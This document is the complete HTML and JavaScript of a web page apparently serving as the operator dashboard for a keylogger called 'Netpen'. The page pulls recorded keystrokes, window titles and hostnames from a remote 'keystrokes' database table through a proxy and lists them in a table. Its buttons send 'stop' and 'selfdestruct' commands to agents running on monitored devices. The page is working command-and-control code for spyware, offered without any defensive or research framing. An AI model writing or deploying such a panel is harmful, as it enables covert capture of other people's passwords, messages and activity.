<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Netpen Activity Log</title>

<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: 'Segoe UI', Arial, sans-serif; background: #0f0f0f; color: #e0e0e0; padding: 20px; }
.container { max-width: 1200px; margin: 0 auto; }
.header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid #333; }
.header h1 { font-size: 24px; font-weight: 300; color: #00d4aa; }
.controls { display: flex; gap: 10px; align-items: center; }
.controls input { background: #1a1a2e; border: 1px solid #333; color: #e0e0e0; padding: 8px 12px; border-radius: 4px; font-size: 14px; width: 180px; }
.controls input::placeholder { color: #666; }
.btn { padding: 8px 20px; border: none; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 600; }
.btn-stop { background: #e74c3c; color: white; }
.btn-stop:hover { background: #c0392b; }
.btn-stop:disabled { background: #555; cursor: not-allowed; }
.btn-destruct { background: #8e44ad; color: white; }
.btn-destruct:hover { background: #732d91; }
.btn-destruct:disabled { background: #555; cursor: not-allowed; }
.btn-refresh { background: #2d2d44; color: #ccc; }
.btn-refresh:hover { background: #3d3d55; }
.status { font-size: 13px; color: #888; margin-bottom: 15px; }
.status span { color: #00d4aa; }
table { width: 100%; border-collapse: collapse; background: #151520; border-radius: 8px; overflow: hidden; }
th { background: #1a1a2e; padding: 12px 16px; text-align: left; font-weight: 600; font-size: 13px; color: #888; text-transform: uppercase; letter-spacing: 1px; border-bottom: 1px solid #2a2a3e; }
td { padding: 10px 16px; border-bottom: 1px solid #1e1e2e; font-size: 14px; font-family: 'Consolas', monospace; }
td.time { color: #888; white-space: nowrap; width: 160px; }
td.host { color: #00d4aa; width: 120px; }
td.window { color: #aaa; max-width: 300px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
td.keys { color: #e0e0e0; word-break: break-all; }
tr:hover td { background: #1a1a25; }
.empty { text-align: center; padding: 40px; color: #555; }
.empty p { margin-top: 8px; font-size: 13px; }
.toast { position: fixed; bottom: 20px; right: 20px; padding: 12px 20px; border-radius: 6px; color: white; font-size: 14px; opacity: 0; transition: opacity 0.3s; z-index: 100; }
.toast.show { opacity: 1; }
.toast.success { background: #27ae60; }
.toast.error { background: #e74c3c; }
</style>
</head>
<body>
<div class="container">
<div class="header">
<h1>Netpen</h1>
<div class="controls">
<input type="text" id="hostnameInput" placeholder="Device hostname" title="Enter the hostname of the device">
<button class="btn btn-stop" id="stopBtn" onclick="sendStop()">Stop Agent</button>
<button class="btn btn-destruct" id="destructBtn" onclick="sendDestruct()">Self Destruct</button>
<button class="btn btn-refresh" onclick="fetchKeys()">Refresh</button>
</div>
</div>
<div class="status" id="status">Connecting...</div>
<table>
<thead><tr><th>Time</th><th>Host</th><th>Window</th><th>Activity</th></tr></thead>
<tbody id="keysBody">
<tr><td class="empty" colspan="4">Waiting for data...<br><br><span style="font-size:11px;color:#555;">Run the agent on the device to begin recording</span></td></tr>
</tbody>
</table>
</div>
<div class="toast" id="toast"></div>

<script>
const PROXY_URL = '/.netlify/functions/proxy';

let refreshInterval = null;
let countdown = 0;

function updateStatus(entryCount) {
    const status = document.getElementById('status');
    status.innerHTML = 'Connected &middot; ' + entryCount + ' entries &middot; Refreshing in ' + countdown + 's';
}

function tick() {
    countdown--;
    if (countdown <= 0) countdown = 20;
    updateStatus(window._lastCount || 0);
}

function showToast(msg, type) {
    const t = document.getElementById('toast');
    t.textContent = msg;
    t.className = 'toast ' + type + ' show';
    setTimeout(() => t.className = 'toast', 3000);
}

async function fetchKeys() {
    try {
        const res = await fetch(PROXY_URL + '?path=/rest/v1/keystrokes&select=created_at,hostname,window_title,keys&order=created_at.desc&limit=100', { headers: {} });
        if (!res.ok) throw new Error(res.status + ' ' + res.statusText);
        const data = await res.json();

        window._lastCount = data ? data.length : 0;
        countdown = 5;
        updateStatus(window._lastCount);
        const tbody = document.getElementById('keysBody');

        if (!data || data.length === 0) {
            tbody.innerHTML = '<tr><td class="empty" colspan="4">No keystrokes recorded yet<br><span style="font-size:11px;color:#555;">Make sure the agent is running on the device</span></td></tr>';
            return;
        }

        let html = '';
        for (let i = 0; i < data.length; i++) {
            const row = data[i];
            const ts = row.created_at ? row.created_at.replace(/Z$|[+\-]\d{2}:?\d{2}$/, '') + 'Z' : null;
            const time = ts ? new Date(ts).toLocaleString() : '-';
            const host = row.hostname || '-';
            const win = row.window_title || '';
            const keys = row.keys || '';
            html += '<tr><td class="time">' + time + '</td><td class="host">' + escapeHtml(host) + '</td><td class="window" title="' + escapeHtml(win) + '">' + escapeHtml(win) + '</td><td class="keys">' + escapeHtml(keys) + '</td></tr>';
        }
        tbody.innerHTML = html;
    } catch (err) {
        countdown = 5;
        document.getElementById('status').innerHTML = 'Error: ' + err.message;
    }
}

async function sendStop() {
    const btn = document.getElementById('stopBtn');
    const hostname = document.getElementById('hostnameInput').value.trim();
    if (!hostname) { showToast('Enter the hostname of the device', 'error'); return; }

    btn.disabled = true;
    btn.textContent = 'Sending...';

    try {
        const res = await fetch(PROXY_URL + '?path=/rest/v1/control', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ command: 'stop', hostname: hostname, executed: false })
        });
        if (!res.ok) throw new Error(res.status + ' ' + res.statusText);
        showToast('Stop command sent to ' + hostname, 'success');
    } catch (err) {
        showToast('Failed: ' + err.message, 'error');
    }

    btn.disabled = false;
    btn.textContent = 'Stop Agent';
}

async function sendDestruct() {
    const btn = document.getElementById('destructBtn');
    const hostname = document.getElementById('hostnameInput').value.trim();
    if (!hostname) { showToast('Enter the hostname of the device', 'error'); return; }
    if (!confirm('Permanently kill the agent on "' + hostname + '"?')) return;

    btn.disabled = true;
    btn.textContent = 'Sending...';

    try {
        const res = await fetch(PROXY_URL + '?path=/rest/v1/control', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ command: 'selfdestruct', hostname: hostname, executed: false })
        });
        if (!res.ok) throw new Error(res.status + ' ' + res.statusText);
        showToast('Self destruct sent to ' + hostname, 'success');
    } catch (err) {
        showToast('Failed: ' + err.message, 'error');
    }

    btn.disabled = false;
    btn.textContent = 'Self Destruct';
}

function escapeHtml(s) {
    if (!s) return '';
    return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

window.addEventListener('DOMContentLoaded', () => {
    fetchKeys();
    refreshInterval = setInterval(fetchKeys, 20000);
    setInterval(tick, 1000);
});
</script>
</body>
</html>
